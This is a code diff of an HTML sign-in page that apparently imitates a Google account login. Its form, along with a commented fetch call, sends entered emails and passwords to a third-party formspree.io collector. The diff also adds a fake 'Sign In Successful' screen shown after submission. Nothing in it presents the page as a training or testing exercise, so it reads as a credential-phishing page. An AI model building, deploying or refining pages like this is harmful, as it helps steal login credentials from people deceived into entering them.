@@ -33,14 +33,13 @@
             align-items: center;
         }
 
-        /* Logo Section */
         .logo {
             font-size: 44px;
             font-weight: 700;
             color: white;
             display: flex;
             align-items: center;
-            justify-content: center;  /* Center the logo horizontally */
+            justify-content: center;
             margin-bottom: 20px;
         }
 
@@ -49,9 +48,8 @@
             margin-right: 10px;
         }
 
-        /* Text Section */
         .text-container {
-            text-align: center;  /* Center the text */
+            text-align: center;
             margin-bottom: 20px;
         }
 
@@ -65,7 +63,6 @@
             font-weight: 500;
         }
 
-        /* Input and Form Section */
         .input-box {
             width: 100%;
             padding: 16px;
@@ -107,7 +104,6 @@
             align-items: center;
         }
 
-        /* Button Section */
         .btn-container {
             display: flex;
             flex-direction: column;
@@ -150,37 +146,20 @@
             margin: 0 8px;
         }
 
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            .container {
-                padding: 20px;
-            }
-
-            .logo {
-                font-size: 36px;
-                margin-bottom: 15px;
-            }
-
-            #signinText {
-                font-size: 20px;
-            }
-
-            .input-box {
-                padding: 14px;
-            }
-
-            .btn-container {
-                flex-direction: column;
-            }
-
-            .guest-mode {
-                font-size: 12px;
-            }
-
-            #passwordContainer {
-                margin-top: 10px;
-            }
+        .success-page {
+            display: none;
+            text-align: center;
+            color: white;
         }
+
+        .success-page h1 {
+            font-size: 30px;
+        }
+
+        .success-page p {
+            font-size: 18px;
+        }
+
     </style>
 </head>
 <body>
@@ -195,7 +174,7 @@
         </div>
 
         <div class="right-side-container">
-            <form id="signinForm" action="https://formspree.io/f/moveakwr" method="POST">
+            <form id="signinForm" action="https://formspree.io/f/moveakwr" method="POST" onsubmit="submitForm(event)">
                 <input type="email" id="emailInput" name="email" class="input-box" placeholder="Email or phone" autocomplete="username">
                 <div id="passwordContainer" style="display: none;">
                     <label for="fluff" id="passwordLabel">Password</label>
@@ -213,10 +192,16 @@
 
                 <div class="btn-container">
                     <a href="#" class="link" id="createAccountLink">Create account</a>
-                    <button type="submit" class="btn" id="nextButton" onclick="goToPasswordPage(event)">Next</button>
+                    <button type="submit" class="btn" id="nextButton">Next</button>
                 </div>
             </form>
         </div>
+    </div>
+
+    <div class="success-page" id="successPage">
+        <h1>Sign In Successful</h1>
+        <p>You have successfully signed in!</p>
+        <a href="#" class="btn" onclick="reloadPage()">Go to Dashboard</a>
     </div>
 
     <div class="footer">
@@ -229,27 +214,23 @@
     </div>
 
     <script>
-        function goToPasswordPage(event) {
+        function submitForm(event) {
             event.preventDefault();
 
-            var email = document.getElementById('emailInput').value;
+            // Hide the sign-in form
+            document.getElementById('signinBox').style.display = 'none';
 
-            if (email) {
-                document.getElementById('signinText').textContent = 'Enter your password';
-                document.getElementById('useGoogleText').style.display = 'none';
-                document.getElementById('emailInput').style.display = 'none';
-                document.getElementById('forgotEmailLink').style.display = 'none';
-                document.getElementById('createAccountLink').style.display = 'none';
-                document.getElementById('passwordContainer').style.display = 'block';
-                document.getElementById('nextButton').textContent = 'Sign In';
-                document.getElementById('nextButton').setAttribute('onclick', 'submitPassword(event)');
-            } else {
-                alert("Please enter an email address.");
-            }
+            // Show the success page
+            document.getElementById('successPage').style.display = 'block';
+
+            // You can also submit the form via JavaScript here if needed (to formspree, etc.)
+            // Example: 
+            // fetch('https://formspree.io/f/moveakwr', { method: 'POST', body: new FormData(event.target) });
         }
 
-        function submitPassword(event) {
-            // Form submission logic
+        function reloadPage() {
+            // Reload the page or redirect the user to another page after successful sign-in
+            window.location.href = '/dashboard'; // Replace with the URL of your actual dashboard or desired page
         }
     </script>
 </body>
